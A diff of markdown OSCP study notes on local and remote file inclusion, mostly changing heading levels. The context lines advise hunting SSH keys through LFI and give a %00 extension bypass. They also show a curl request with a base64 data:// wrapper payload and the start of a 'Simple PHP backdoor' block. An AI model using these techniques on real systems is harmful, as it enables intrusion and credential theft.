@@ -1,11 +1,12 @@
-# LFI / RFI
+## LFI / RFI
 
 ON OSCP, if you are able to find LFI anywhere, hunt down the SSH keys first
 
+### Links
 - [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html)
 - [Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/)
 - [LFI Medium Article](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601)
-## Local File Inclusion:
+### Local File Inclusion:
 
 1. Check if you can convert LFI to RFI
 2. Try adding %00 to bypass the added extension on the server side. (Works on PHP < 5.3)
@@ -113,7 +114,7 @@ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64
 
 ![File Inclusion Example](FileInclusionExample.png)
 
-# Remote File Inclusion
+## Remote File Inclusion
 
 ```
 //Simple PHP backdoor
